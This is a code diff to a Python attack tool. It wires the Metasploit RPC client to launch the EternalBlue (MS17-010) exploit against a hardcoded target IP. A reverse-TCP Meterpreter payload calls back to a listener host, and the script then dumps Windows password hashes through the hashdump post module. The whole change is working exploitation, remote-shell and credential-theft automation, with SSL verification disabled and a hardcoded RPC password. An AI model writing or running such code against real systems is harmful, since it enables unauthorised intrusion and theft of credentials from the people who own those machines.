@@ -1,8 +1,13 @@
+from __future__ import print_function
+
 import nmap
 import re
 import sys
 import subprocess
 import socket
+from metasploit.msfrpc import MsfRpcClient
+import ssl
+import time
 
 def header():
     print("""
@@ -50,15 +55,38 @@ def nmScan(ip):
     return targets
 
 def eternalBlue(ip):
-    pass
+    try:
+        _create_unverified_https_context = ssl._create_unverified_context
+    except AttributeError:
+        pass
+    else:
+        ssl._create_default_https_context = _create_unverified_https_context
+    client = MsfRpcClient('password')
+    exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
+    exploit['RHOST'] = '10.202.208.172'
+    payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
+    payload['LHOST'] = '10.202.208.230'
+    exploit.execute(payload=payload)
+    proc = exploit.execute(payload=payload)
+    time.sleep(5)
+    shell = client.sessions.session(proc.get('job_id'))
+    shell.runsingle('run post/windows/gather/hashdump')
+    while(True):
+        output = shell.read()
+        if( len(output) > 0):
+            print(output)
+        if(':::' in output):
+            print(repr(output))
+            break
 
 def main():
     header()
     ip = sys.argv[1]
+    eternalBlue(ip)
     # firstMachine('hacker', 'toor', '169.254.121.23')
     #print(socket.gethostbyname(socket.gethostname()))
-    target_hosts = nmScan(ip)
-    print("Found {} targets.".format(len(target_hosts)))
+    #target_hosts = nmScan(ip)
+    #print("Found {} targets.".format(len(target_hosts)))
 
 if __name__ == "__main__":
     # execute only if run as a script
